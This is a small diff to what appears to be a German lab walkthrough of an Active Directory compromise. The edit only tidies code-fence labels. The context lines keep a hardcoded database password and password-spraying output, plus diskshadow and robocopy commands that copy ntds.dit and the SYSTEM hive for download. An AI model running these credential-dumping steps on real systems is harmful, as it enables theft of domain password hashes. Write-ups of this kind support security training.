@@ -59,7 +59,6 @@ $password = "SuperSecureMySQLPassw0rd1337.";
 
 **Config-Datei finden:**
 
-cmd
 
 ```cmd
 cd C:\Users\ellen.freeman\Documents
@@ -242,7 +241,6 @@ Caroline.Robinson → STATUS_PASSWORD_MUST_CHANGE
 
 **Shadow Copy erstellen:**
 
-powershell
 
 ```powershell
 "set context persistent nowriters" | Out-File extract.dsh -Encoding ASCII
@@ -254,7 +252,6 @@ diskshadow /s extract.dsh
 
 **Dateien kopieren:**
 
-cmd
 
 ```cmd
 robocopy z:\windows\ntds C:\Temp ntds.dit /B
@@ -263,7 +260,6 @@ robocopy z:\windows\system32\config C:\Temp system /B
 
 **Download:**
 
-powershell
 
 ```powershell
 download ntds.dit
